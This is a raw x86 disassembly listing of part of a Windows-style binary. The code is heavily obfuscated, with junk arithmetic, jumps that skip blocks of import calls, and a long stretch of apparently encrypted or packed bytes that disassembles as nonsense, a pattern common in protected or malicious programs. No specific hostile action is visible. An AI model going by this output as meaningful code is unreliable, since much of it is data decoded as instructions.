  41fb0c:	mov    DWORD PTR ds:0x42819f,ebx
  41fb12:	mov    DWORD PTR ds:0x428347,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x4281db,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e7c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283e3
  41fb48:	or     ecx,DWORD PTR ds:0x4282b3
  41fb4e:	mov    DWORD PTR ds:0x4283e3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x4281ab
  41fb5a:	add    ecx,DWORD PTR ds:0x4283e3
  41fb60:	mov    DWORD PTR ds:0x4281ab,ecx
  41fb66:	sbb    DWORD PTR ds:0x4282cb,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x4282df
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42828f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428297,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x4281cf,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x4282c7,0x4282cb
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x4283db,0x428343
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x4283af,0x0
  41fbc2:	mov    DWORD PTR ds:0x4281db,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283e7,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x4282b7,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x4281b7,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x4283af,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42811f
  41fbfd:	call   DWORD PTR ds:0x428e80
  41fc03:	and    ecx,DWORD PTR ds:0x4282a3
  41fc09:	adc    DWORD PTR ds:0x428333,ecx
  41fc0f:	sub    DWORD PTR ds:0x42833b,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x4283ab
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42826b
  41fc21:	mov    DWORD PTR ds:0x4283ab,ecx
  41fc27:	and    DWORD PTR ds:0x428353,0x55d2
  41fc31:	add    DWORD PTR ds:0x4281cf,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x4282bf,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x4282cf
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42819b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x4282b7,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42826f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x4282d3,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282e7,0x2746
  41fc84:	mov    DWORD PTR ds:0x4282b7,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x4281ab,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42826f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428ef4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283e3
  41fcc1:	and    DWORD PTR ds:0x4281ab,0x42835f
  41fccb:	mov    ecx,DWORD PTR ds:0x4281b3
  41fcd1:	xor    DWORD PTR ds:0x42827f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x4282c7
  41fcde:	sub    DWORD PTR ds:0x4283d3,ecx
  41fce4:	mov    DWORD PTR ds:0x428283,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283e7
  41fd0b:	add    eax,DWORD PTR ds:0x4281af
  41fd11:	mov    ds:0x4283e7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428353,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x42833b
  41fd39:	mov    ecx,DWORD PTR ds:0x4283cb
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42826b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428353,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e84
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x4282b3,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42828f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282f3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x4282df,ecx
  41fd92:	sbb    DWORD PTR ds:0x4283d3,0x42835b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42834f,0x428353
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x4281bf,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x4283af
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x4283af
  41fe15:	xor    DWORD PTR ds:0x4283b7,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x4281af,0x0
  41fe51:	not    DWORD PTR ds:0x4282db
  41fe57:	mov    DWORD PTR ds:0x428277,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x4281af,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e88
  41fe7d:	and    DWORD PTR ds:0x4283c7,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42827f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428357
  41fe94:	and    DWORD PTR ds:0x428333,ecx
  41fe9a:	and    DWORD PTR ds:0x4282a7,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281eb
  41feab:	mov    ecx,DWORD PTR ds:0x42841f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x4281cf
  41fed3:	or     DWORD PTR ds:0x4283e3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x4282ab,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x4283af,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x42832b,ecx
  41ff06:	cmp    DWORD PTR ds:0x4282ab,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428193
  41ff18:	call   DWORD PTR ds:0x428ef8
  41ff1e:	or     ecx,DWORD PTR ds:0x4281b3
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428357,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42827b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x34
  41ff55:	xor    eax,0x162323be
  41ff5b:	sbb    BYTE PTR [ebx+0x51181812],ah
  41ff61:	mov    esi,0xba15f86b
  41ff66:	xor    BYTE PTR [esi+0x2705f62f],dl
  41ff6c:	std    
  41ff6d:	mov    esp,DWORD PTR [ecx+edi*2+0xe8fbeca]
  41ff74:	push   ebp
  41ff75:	das    
  41ff76:	and    dh,BYTE PTR [edx+eiz*2]
  41ff79:	inc    edx
  41ff7a:	scas   al,BYTE PTR es:[edi]
  41ff7b:	fsubp  st(2),st
  41ff7d:	and    eax,0x263f4486
  41ff82:	fwait
  41ff83:	(bad)  
  41ff84:	mov    al,0xe0
  41ff86:	push   ds
  41ff87:	or     eax,0xb522eeb0
  41ff8c:	pop    ecx
  41ff8d:	lahf   
  41ff8e:	jb     0x41ffdd
  41ff90:	sub    ebx,0x95641d52
  41ff96:	shr    BYTE PTR [edx+ebx*8+0x58825429],0x93
  41ff9e:	loope  0x420008
  41ffa0:	xor    ecx,DWORD PTR [ecx]
  41ffa2:	push   eax
  41ffa3:	mov    esi,0xb691b0bd
  41ffa8:	cs mov ecx,0xae7c4470
  41ffae:	xor    ebx,DWORD PTR [ebx-0x5e]
  41ffb1:	icebp  
  41ffb2:	adc    DWORD PTR [ecx+0x35],0x807a5b9b
  41ffb9:	inc    BYTE PTR [ecx]
  41ffbb:	and    DWORD PTR [ebx],ebx
  41ffbd:	xchg   edi,eax
  41ffbe:	mov    eax,ds:0x4e9c0d73
  41ffc3:	es mov ah,0x3c
  41ffc6:	xor    al,0xe2
  41ffc8:	sub    al,0xe9
  41ffca:	loopne 0x41ffcd
  41ffcc:	in     al,dx
  41ffcd:	or     edi,esi
  41ffcf:	jmp    0x12d96a0e
  41ffd4:	xchg   esi,eax
  41ffd5:	push   edx
  41ffd6:	(bad)  
  41ffd8:	in     eax,dx
  41ffd9:	inc    ebx
  41ffda:	jg     0x420055
  41ffdc:	push   ss
  41ffdd:	outs   dx,DWORD PTR ds:[esi]
  41ffde:	das    
  41ffdf:	xchg   ebp,eax
  41ffe0:	jno    0x420051
  41ffe2:	mov    eax,ds:0xeae289c1
  41ffe7:	xor    DWORD PTR [esi+0x55b57203],0xc2720324
  41fff1:	jmp    0xd5f9cfe5
  41fff6:	push   es
  41fff7:	(bad)  
  41fff8:	pushf  
  41fff9:	pushf  
  41fffa:	stc    
  41fffb:	mov    ecx,0x6c529786
  420000:	frstor [ecx]
  420002:	loop   0x41ff95
  420004:	or     al,0xc3
  420006:	call   0xfca9c48c
  42000b:	cli    
  42000c:	or     DWORD PTR [esi-0x66],esp
  42000f:	xchg   ebx,eax
  420010:	or     DWORD PTR [eax+eiz*8+0x20],esp
  420014:	loopne 0x420018
  420016:	jge    0x41ffe4
  420018:	sti    
  420019:	pop    ds
  42001a:	les    edi,FWORD PTR [esp+eax*8-0x3e]
  42001e:	int    0x91
  420020:	mov    bh,0xec
  420022:	mov    eax,ds:0x454338b4
  420027:	ja     0x420010
  420029:	pop    es
  42002a:	stc    
  42002b:	rcl    BYTE PTR es:[ecx-0x30],1
  42002f:	fistp  QWORD PTR ds:[edx-0x78]
  420033:	and    ch,BYTE PTR [eax-0x16]
  420036:	lea    edi,[edi]
  420038:	pop    eax
  420039:	push   ebx
  42003a:	mov    eax,0x2dee2fac
  42003f:	dec    ecx
  420040:	or     BYTE PTR [ebp+0x3cd04980],bh
  420046:	ret    0xbc4c
  420049:	xchg   DWORD PTR [edi],edi
  42004b:	int3   
  42004c:	into   
  42004d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42004e:	add    ah,0x1e
  420051:	test   eax,0x6dd54640
  420056:	shl    BYTE PTR [ebx],cl
  420058:	ins    DWORD PTR es:[edi],dx
  420059:	dec    ebp
  42005a:	dec    ebx
  42005b:	lahf   
  42005c:	push   0xfffffff1
  42005e:	retf   0x17ec
  420061:	or     esp,DWORD PTR [ebp+0x62]
  420064:	xchg   edx,eax
  420065:	mov    edi,0xe3c6b3f4
  42006a:	and    DWORD PTR [esi-0xf1edbd6],ecx
  420070:	cmp    BYTE PTR [ebx],al
  420072:	(bad)
  420075:	mov    ecx,0x3ebf01ed
  42007a:	je     0x420034
  42007c:	hlt    
  42007d:	pop    ebx
  42007e:	scas   eax,DWORD PTR es:[edi]
  42007f:	ret    0x358d
  420082:	sbb    ecx,DWORD PTR [edx]
  420084:	mov    ecx,0xa7bca055
  420089:	and    eax,0xf6d5253c
  42008e:	mov    esi,0x2123c919
  420093:	sbb    al,0x2d
  420095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420096:	inc    ebp
  420097:	inc    esi
  420098:	jmp    0x42003a
  42009a:	mov    cl,BYTE PTR [edi-0x4c]
  42009d:	daa    
  42009e:	idiv   ecx
  4200a0:	add    ch,ah
  4200a2:	xor    edi,DWORD PTR [edx]
  4200a4:	sar    BYTE PTR [edx+0x15bda67e],0xd
  4200ab:	cmp    dh,dh
  4200ad:	sbb    ah,bl
  4200af:	popf   
  4200b0:	jns    0x420098
  4200b2:	inc    esi
  4200b3:	sbb    al,0x9c
  4200b5:	xchg   esp,eax
  4200b6:	mov    esp,0x2008e8a2
  4200bb:	(bad)  
  4200bd:	push   esi
  4200bf:	jge    0x420131
  4200c1:	idiv   BYTE PTR [esi-0x11abaf56]
  4200c7:	jne    0x42012c
  4200c9:	mov    eax,ds:0x5d4f2b8c
  4200ce:	fistp  WORD PTR [ecx+eax*8]
  4200d1:	addr16 retw 
  4200d4:	shl    DWORD PTR [edi],0xe7
  4200d7:	xor    al,0x3b
  4200d9:	cmp    ebx,DWORD PTR gs:[eax]
  4200dc:	jb     0x42006d
  4200de:	xchg   BYTE PTR [esi+0x74939474],bl
  4200e4:	test   al,0x27
  4200e6:	popf   
  4200e7:	jbe    0x420112
  4200e9:	sub    edx,ebx
  4200eb:	and    dl,BYTE PTR [edx+0x4428503a]
  4200f1:	mov    bl,0xb0
  4200f3:	dec    ebp
  4200f4:	popf   
  4200f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f6:	out    0x9d,eax
  4200f8:	in     eax,0x1a
  4200fa:	stos   DWORD PTR es:[edi],eax
  4200fb:	int    0xd0
  4200fd:	mov    eax,0xd6b3fabd
  420102:	mul    BYTE PTR [esi+0x65]
  420105:	jb     0x4200a0
  420107:	aam    0x9b
  420109:	xchg   ebp,eax
  42010a:	iret   
  42010b:	cdq    
  42010c:	jb     0x420180
  42010e:	dec    eax
  42010f:	and    ebp,DWORD PTR [ecx-0x75]
  420112:	cmp    al,0x46
  420114:	jmp    0x420114
  420116:	lds    eax,FWORD PTR [ebx]
  420118:	cmc    
  420119:	push   eax
  42011a:	cmp    esi,DWORD PTR [edi]
  42011c:	inc    esp
  42011d:	jno    0x4200b0
  42011f:	into   
  420120:	pop    eax
  420121:	jge    0x420146
  420123:	imul   ecx,DWORD PTR ds:0xc41382a7,0x9113cacd
  42012d:	cmc    
  42012e:	pusha  
  42012f:	sub    edi,DWORD PTR [edi]
  420131:	mov    ebp,0xfea83a50
  420136:	sub    BYTE PTR [ebx+0x57db72c5],cl
  42013c:	adc    dl,BYTE PTR [ebx-0x6c]
  42013f:	push   ebp
  420141:	in     al,0x39
  420143:	mov    ah,0x1a
  420145:	push   ecx
  420146:	scas   eax,DWORD PTR es:[edi]
  420147:	push   ss
  420148:	sub    al,0x7f
  42014a:	mov    bh,ch
  42014c:	mov    ah,BYTE PTR [ecx+esi*1-0x5cc3fec0]
  420153:	ss (bad) 
  420155:	ret    0xafe1
  420158:	push   ebp
  420159:	aad    0x38
  42015b:	or     al,0x13
  42015d:	popf   
  42015e:	hlt    
  42015f:	mov    cl,0xea
  420161:	ds cli 
  420163:	push   esp
  420164:	push   esp
  420165:	enter  0xbe52,0x6b
  420169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42016a:	push   cs
  42016b:	dec    esi
  42016c:	test   eax,eax
  42016e:	les    edi,FWORD PTR [eax+eax*4+0x44]
  420172:	out    dx,eax
  420173:	pop    esp
  420174:	xchg   ecx,eax
  420175:	push   edi
  420176:	fbstp  TBYTE PTR [ebx+edx*4+0x3211120d]
  42017d:	int    0x5a
  42017f:	test   BYTE PTR [ebx],cl
  420181:	and    BYTE PTR [esi-0x7d880894],0x17
  420188:	lds    eax,FWORD PTR [ebp+0x67]
  42018b:	mov    ds:0xc1452779,eax
  420190:	aaa    
  420191:	pop    edx
  420192:	mov    ecx,0xe8a86740
  420197:	sub    cl,BYTE PTR [edx-0x43]
  42019a:	jmp    0x528f8f47
  42019f:	ins    BYTE PTR es:[edi],dx
  4201a0:	sub    ecx,DWORD PTR [eax+0x28c005a]
  4201a6:	clc    
  4201a7:	jo     0x4201eb
  4201a9:	jle    0x420187
  4201ab:	(bad)  [edx+esi*2]
  4201ae:	pop    ebp
  4201af:	xchg   BYTE PTR [esi+0x26e44163],ah
  4201b5:	or     al,0x5d
  4201b7:	out    0x63,eax
  4201b9:	loopne 0x4201f7
  4201bb:	les    eax,FWORD PTR [edi+0xe]
  4201be:	mov    WORD PTR [edx+0x52],?
  4201c1:	jg     0x42023e
  4201c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c4:	iret   
  4201c5:	inc    esp
  4201c6:	dec    ecx
  4201c7:	add    ecx,DWORD PTR [edi+0x50]
  4201ca:	xor    BYTE PTR [eax-0x6],bh
  4201cd:	fs aam 0x1a
  4201d0:	mov    esi,0xdd6da392
  4201d5:	dec    edx
  4201d6:	add    BYTE PTR [edx+0x6442d41c],bh
  4201dc:	fidivr DWORD PTR [esi+0x4918293b]
  4201e2:	sub    eax,0x91012b28
  4201e7:	and    dl,0x17
  4201ea:	jg     0x4201ba
  4201ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ed:	xchg   ebx,eax
  4201ee:	(bad)
  4201f1:	cmp    bl,BYTE PTR [edx-0x1f44def8]
  4201f7:	push   ebx
  4201f8:	xchg   edi,eax
  4201f9:	and    ebx,ecx
  4201fb:	or     BYTE PTR [eax],0xdc
  4201fe:	push   0x5e
  420200:	cs out 0x84,al
  420203:	int3   
  420204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420205:	mov    eax,DWORD PTR [edx-0x6e232d53]
  42020b:	fisub  WORD PTR [ebx-0x6]
  42020e:	(bad)
  420213:	addr16 pop ebx
  420215:	jmp    0x420265
  420217:	pop    ebp
  420218:	and    esp,ebx
  42021a:	dec    edi
  42021b:	sti    
  42021c:	ins    DWORD PTR es:[edi],dx
  42021d:	or     ch,al
  42021f:	pop    esi
  420220:	(bad)  
  420221:	jns    0x42028a
  420223:	pop    es
  420224:	dec    edx
  420225:	fidivr WORD PTR ds:0x9b9baa5a
  42022c:	push   ss
  42022d:	ss pop edi
  42022f:	rcr    DWORD PTR [ecx-0x16],1
  420232:	call   0x15e8:0x541a2fd4
  420239:	sahf   
  42023a:	sub    al,0x10
  42023c:	aam    0xa5
  42023e:	and    eax,0xbe3021dd
  420243:	daa    
  420244:	es pop esi
  420246:	dec    esp
  420247:	push   esp
  420248:	dec    ebx
  420249:	test   BYTE PTR [esi-0x6c],0xe0
  42024d:	mov    ds:0x4afe4ffd,eax
  420252:	pop    edx
  420253:	or     dh,BYTE PTR [edi]
  420255:	push   es
  420256:	fs jmp 0x420242
  420259:	fdivr  DWORD PTR [esi]
  42025b:	(bad)  [ebp+0x535ab70f]
  420261:	outs   dx,BYTE PTR ds:[esi]
  420262:	fiadd  DWORD PTR [ebp-0x702409ef]
  420268:	mov    WORD PTR [edx+ebx*1-0x4d],gs
  42026c:	js     0x420261
  42026e:	xor    al,0x4a
  420270:	popf   
  420271:	cdq    
  420272:	adc    eax,0x8d8954e9
  420277:	repnz mov ah,0xb8
  42027a:	cmp    al,0xed
  42027c:	arpl   WORD PTR ds:0x796a7db1,sp
  420282:	pop    ecx
  420283:	cdq    
  420284:	mov    ch,0xb1
  420286:	rol    DWORD PTR [ebx-0x5df9143b],1
  42028c:	mov    ds:0x969a42dc,eax
  420291:	xchg   edi,eax
  420292:	cwde   
  420293:	jge    0x420288
  420295:	mov    dh,0xfe
  420297:	mov    WORD PTR [edx+eax*4-0x37],ds
  42029b:	pop    ss
  42029c:	sbb    DWORD PTR [ecx-0x13727419],edx
  4202a2:	(bad)  
  4202a3:	(bad)  
  4202a4:	inc    DWORD PTR [ecx+0x4282cf0d]
  4202aa:	add    BYTE PTR [ebx-0x7d],cl
  4202ad:	inc    edx
  4202ae:	add    BYTE PTR [ebx],ch
  4202b0:	ror    DWORD PTR [ebx+0x4283c70d],0x0
  4202b7:	add    DWORD PTR ds:0x42834f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x4283cb,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x4281a7,0x4282c7
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x4283bb,0x42819f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x4282b3,0x42826b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42834b,0x0
  42030c:	mov    DWORD PTR ds:0x4282a3,edx
  420312:	mov    esi,DWORD PTR ds:0x42826b
  420318:	mov    DWORD PTR ds:0x428347,ebx
  42031e:	mov    DWORD PTR ds:0x428357,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x4281c3,0x3019
  420337:	not    DWORD PTR ds:0x42834b
  42033d:	cmp    DWORD PTR ds:0x42834b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x4283ab
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428efc
  420363:	adc    ecx,DWORD PTR ds:0x428283
  420369:	xor    DWORD PTR ds:0x42833f,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42825b
  420377:	mov    esi,DWORD PTR ds:0x428313
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x4281c7,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x42833b,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x4283b7,0x0
  4203b4:	mov    DWORD PTR ds:0x4282df,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x4281db
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42829f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42829b,edi
  4203db:	cmp    DWORD PTR ds:0x4283b7,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x42802f
  4203ed:	call   DWORD PTR ds:0x428f00
  4203f3:	movzx  esi,WORD PTR ds:0x4281b7
  4203fa:	add    DWORD PTR ds:0x428337,esi
  420400:	adc    DWORD PTR ds:0x4281d7,ebx
  420406:	add    DWORD PTR ds:0x4283b3,0x22a2
  420410:	and    esi,DWORD PTR ds:0x4283b3
  420416:	or     DWORD PTR ds:0x4283af,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x428333
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x4282b3,0x0
  42042e:	mov    DWORD PTR ds:0x4283b3,0x5615
  420438:	mov    DWORD PTR ds:0x4281ab,0x419b
  420442:	mov    DWORD PTR ds:0x4281cf,0x389d
  42044c:	not    DWORD PTR ds:0x4282a3
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x4282b3,0x0
  420463:	je     0x4204a0
  420469:	push   0x42827f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428f04
  420477:	sub    DWORD PTR ds:0x428337,0x6950
  420481:	movzx  esi,WORD PTR ds:0x4282ab
  420488:	xor    esi,DWORD PTR ds:0x42835b
  42048e:	mov    DWORD PTR ds:0x4282ab,esi
  420494:	mov    esi,DWORD PTR ds:0x428293
  42049a:	or     DWORD PTR ds:0x42832f,esi
  4204a0:	xor    DWORD PTR ds:0x42835f,ecx
  4204a6:	add    DWORD PTR ds:0x42835f,ebx
  4204ac:	or     DWORD PTR ds:0x4283b7,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x4281cb,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x4281af,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283e7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x4281cb,0x0
  420500:	mov    DWORD PTR ds:0x428333,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x4282cf
  42051b:	cmp    DWORD PTR ds:0x4281cb,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428f08
  420543:	mov    esi,DWORD PTR ds:0x4281bb
  420549:	sbb    DWORD PTR ds:0x4281d7,esi
  42054f:	and    DWORD PTR ds:0x4282d3,edx
  420555:	sbb    DWORD PTR ds:0x428287,edx
  42055b:	mov    esi,DWORD PTR ds:0x4283bf
  420561:	or     DWORD PTR ds:0x4283c3,esi
  420567:	mov    esi,DWORD PTR ds:0x4281e7
  42056d:	mov    edx,DWORD PTR ds:0x42837f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x4283bf,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x4281b3,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x4283d7,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428273,0x2222
  4205bd:	not    DWORD PTR ds:0x428283
  4205c3:	cmp    DWORD PTR ds:0x4281b3,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x4283df
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e8c
  4205e8:	xor    edx,DWORD PTR ds:0x428287
  4205ee:	mov    ecx,DWORD PTR ds:0x42826f
  4205f4:	or     DWORD PTR ds:0x42819f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428313
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x4283db,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x4282bb
  42061a:	xor    DWORD PTR ds:0x4282a7,edx
